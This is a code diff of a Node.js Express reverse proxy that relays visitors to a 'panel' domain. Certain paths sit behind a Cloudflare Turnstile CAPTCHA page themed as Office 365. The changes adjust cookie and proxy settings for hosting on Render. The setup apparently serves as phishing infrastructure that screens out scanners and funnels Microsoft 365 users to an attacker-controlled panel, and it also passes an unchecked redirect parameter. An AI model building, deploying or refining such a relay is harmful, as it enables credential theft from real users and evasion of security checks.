@@ -3,10 +3,13 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// ----- CONFIGURATION -----
-const PANEL = 'portal42-343.sbs';                     // Your VPS domain
-const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';          // Your Turnstile Site Key
-const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY';       // ⚠️ REPLACE WITH YOUR SECRET KEY
+// ----- CRITICAL: Trust proxy (Render uses HTTPS termination) -----
+app.set('trust proxy', 1);
+
+// ----- CONFIG (replace with your actual keys) -----
+const PANEL = 'portal42-343.sbs';
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
+const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY';  // ⚠️ REPLACE WITH YOUR SECRET
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -32,7 +35,7 @@ app.get('/device/*', (req, res) => {
 app.post('/verify-captcha', async (req, res) => {
     const token = req.body['cf-turnstile-response'];
     if (!token) return res.status(400).send('Missing token');
-    
+
     try {
         const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
             method: 'POST',
@@ -41,8 +44,13 @@ app.post('/verify-captcha', async (req, res) => {
         });
         const data = await verify.json();
         if (data.success) {
-            // Set cookie to bypass CAPTCHA for 5 minutes
-            res.cookie('captcha_passed', 'true', { maxAge: 300000, httpOnly: true });
+            // ✅ Set cookie with correct options for Render
+            res.cookie('captcha_passed', 'true', {
+                maxAge: 300000,           // 5 minutes
+                httpOnly: true,
+                secure: true,             // required for HTTPS
+                sameSite: 'lax'
+            });
             const returnTo = req.query.return || '/';
             res.redirect(returnTo);
         } else {
@@ -54,14 +62,14 @@ app.post('/verify-captcha', async (req, res) => {
     }
 });
 
-// ----- PROXY (only for requests that have passed CAPTCHA) -----
+// ----- PROXY (only for requests with valid cookie) -----
 app.use('*', async (req, res) => {
     // Check CAPTCHA cookie for protected paths
     const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
     if (isProtected && !req.cookies.captcha_passed) {
         return res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
     }
-    
+
     try {
         const target = new URL(req.originalUrl, `https://${PANEL}`);
         const headers = new Headers(req.headers);
@@ -90,7 +98,7 @@ app.use('*', async (req, res) => {
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ----- CAPTCHA HTML (with Office 365 theme) -----
+// ----- CAPTCHA HTML (Office 365 Theme) -----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
